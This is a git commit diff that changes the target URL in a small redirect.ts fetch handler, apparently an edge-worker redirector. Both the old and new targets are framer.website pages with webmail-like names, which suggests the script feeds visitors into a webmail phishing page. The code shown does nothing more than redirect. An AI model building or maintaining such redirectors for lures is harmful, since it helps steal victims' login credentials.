85ddd9efc686c51002395ef3f69e7aafca21d70f
mcmeojo-ctrl <mcmeojo@gmail.com>
2026-01-02 08:41:11 +0100

    Update redirect URL in redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://cookupwithtelsrrraaawebmail.framer.website"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://alocatetomywebmailservice.framer.website"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
